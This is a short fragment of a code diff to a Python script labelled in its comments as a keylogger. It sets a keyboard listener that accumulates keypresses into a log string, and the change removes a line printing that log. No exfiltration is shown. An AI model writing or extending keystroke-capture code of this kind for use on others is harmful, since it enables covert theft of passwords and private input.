@@ -44,7 +44,5 @@ def down(key):     # main function
                     insult += '-'
                 keylog = keylog[:-len(fx):] + insult
 
-    print(keylog)
-
 with k.Listener(on_press=down) as listener:     # keylogger
     listener.join()
